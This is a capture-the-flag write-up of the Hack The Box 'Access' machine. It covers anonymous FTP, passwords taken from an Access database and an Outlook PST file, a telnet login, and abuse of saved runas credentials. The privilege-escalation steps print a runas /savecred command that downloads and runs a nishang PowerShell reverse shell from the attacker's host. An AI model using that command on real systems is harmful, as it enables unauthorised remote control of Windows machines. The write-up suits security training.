---
title:     "Hack The Box - Access"
tags: [windows,easy,ftp,nishang,runas]
layout: post
---


![a2b5c4b922dc46bc8769c75c2412cf09.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-access/5416e4b207874ede9a07bbfb997dc2c8.png)


We are going to pwn Access from Hack The Box.

Link: <https://www.hackthebox.eu/home/machines/profile/156>

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```
## HTTP:

It seems like a normal webpage.
![64890ddad32d6229bb16687fb3bb23af.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-access/cc64ea5343cd4d46aecbbff859d27037.png)

## FTP:

I tried `anonymous` login without a password.
```
root@w0lf:~/CTF/HTB/Boxes/Access# ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
```

There is `backup.mdb` in the `Backups` folder, downloaded that to my machine.
```
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 28296 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
5652480 bytes received in 9.53 secs (579.4325 kB/s)
```
It is a `Microsoft Access Database` file.


And `Access Control.zip` file in the `Engineer` folder, downloaded that to my machine.
```
ftp> cd Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get "Access Control.zip"
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 45 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
10870 bytes received in 0.69 secs (15.4442 kB/s)
```
I tried extracting the `.zip` file and it asks for password.<br/>
![b82fe4512bb48c1f143388f5157a248e.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-access/e174857a05994b6a85afcea298773c09.png)

Ok Let's check Access Database. We can use [MDBOpener](https://www.mdbopener.com/), which makes our work simple.<br/>
![34ea2572675588d4da0b374d41da6893.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-access/fe970e9cebc24b25a3f9d5f7fd945697.png)<br/>
It extracts all the tables. We can even view them, which checking those tables.

Seems Interesting:<br/>
![bf760233a919433cf9310831d6205021.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-access/085542bc523249599f6be80935728f5e.png)

It gives me some password, maybe one of them will work to extract the `.zip` file.
![e0b1f1de3e3cbac8d488ac816b65ba70.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-access/ef243b0393b047418311eb2c8e7e8bda.png)

`access4u@security` this password works.
```
root@w0lf:~/CTF/HTB/Boxes/Access/10.10.10.98/Engineer# 7z x Access\ Control.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=aa_DJ.utf8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok         

Size:       271360
Compressed: 10870
root@w0lf:~/CTF/HTB/Boxes/Access/10.10.10.98/Engineer# ls
'Access Control.pst'  'Access Control.zip'
```

Another file, which is:
```
root@w0lf:~/CTF/HTB/Boxes/Access/10.10.10.98/Engineer# file Access\ Control.pst 
Access Control.pst: Microsoft Outlook email folder (>=2003)
```
There is a tool in kali `readpst` we can use it against `.pst` file.

Now we got a `.mbox` file. We can directly read the file by using `cat`.
```
root@w0lf:~/CTF/HTB/Boxes/Access/10.10.10.98/Engineer# readpst Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.
root@w0lf:~/CTF/HTB/Boxes/Access/10.10.10.98/Engineer# ls
'Access Control.mbox'  'Access Control.pst'  'Access Control.zip'
```

`Access Control.mbox`
```
Hi there,
  The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,
John
```
We got a username and password.


## Getting a Shell:

We know the `telnet`service is open. And we have a login on it.
```
root@w0lf:~/CTF/HTB/Boxes/Access# telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security

08/23/2018  11:52 PM    <DIR>          .
08/23/2018  11:52 PM    <DIR>          ..
08/24/2018  08:37 PM    <DIR>          .yawcam
08/21/2018  11:35 PM    <DIR>          Contacts
08/28/2018  07:51 AM    <DIR>          Desktop
08/21/2018  11:35 PM    <DIR>          Documents
08/21/2018  11:35 PM    <DIR>          Downloads
08/21/2018  11:35 PM    <DIR>          Favorites
08/21/2018  11:35 PM    <DIR>          Links
08/21/2018  11:35 PM    <DIR>          Music
08/21/2018  11:35 PM    <DIR>          Pictures
08/21/2018  11:35 PM    <DIR>          Saved Games
08/21/2018  11:35 PM    <DIR>          Searches
08/24/2018  08:39 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  16,773,005,312 bytes free

C:\Users\security>

```

While Enumerating I found an Interesting file `ZKAccess3.5 Security System.lnk` in `C:\Users\Public\Desktop`.
```
C:\Users\Public>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public

07/14/2009  05:57 AM    <DIR>          .
07/14/2009  05:57 AM    <DIR>          ..
08/28/2018  07:51 AM    <DIR>          Desktop
07/14/2009  05:57 AM               174 desktop.ini
07/14/2009  06:06 AM    <DIR>          Documents
07/14/2009  05:57 AM    <DIR>          Downloads
07/14/2009  03:34 AM    <DIR>          Favorites
07/14/2009  05:57 AM    <DIR>          Libraries
07/14/2009  05:57 AM    <DIR>          Music
07/14/2009  05:57 AM    <DIR>          Pictures
07/14/2009  05:57 AM    <DIR>          Videos
               1 File(s)            174 bytes
              10 Dir(s)  16,772,575,232 bytes free

C:\Users\Public>cd Desktop

C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)  16,772,575,232 bytes free

```

I did `type` on that file.
![15f2e2c931dd61cae2921b2755850253.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-access/c45df566a0814b18b8d240c48f838fc2.png)

The interesting thing that catches my eye is:
```
runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred
```

>**runas** is a command in the Microsoft Windows line of operating systems that allows a user to run specific tools and programs under a different username.

>**/savecred**
Indicates if the credentials have been previously saved by this user. This parameter is not available and will be ignored on Windows Vista Home or Windows Vista Starter Editions. This parameter cannot be used with the /smartcard parameter.

So we can try to get a reverse shell from `nishang` with user `Administrator`. I used `nishang/Shells/Invoke-PowerShellTcp.ps1` and copied that to my directory.

## Privilege Escalation:

### Step 1:
Started python server on my machine.
```
root@w0lf:~/CTF/HTB/Boxes/Access# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

### Step 2:
If we look at the Shell it gives us some of the examples.
```
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
```

I copied the example and changed it to my IP and paste it at the bottom of the file.
![b1b602b986362e8727ebbe25b7b21232.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-access/bf400a7b73e0410ca78a0d5418b14d2b.png)

### Step 3:

How to use `runas`?
***Reference:***<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)>

I Started my Netcat listener.

```runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')"```

![2a49fb6f23a4471feb5d7c6dd25223db.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-access/cc43dc6d229348ddac78b8df775b6d68.png)
We Owned root!!






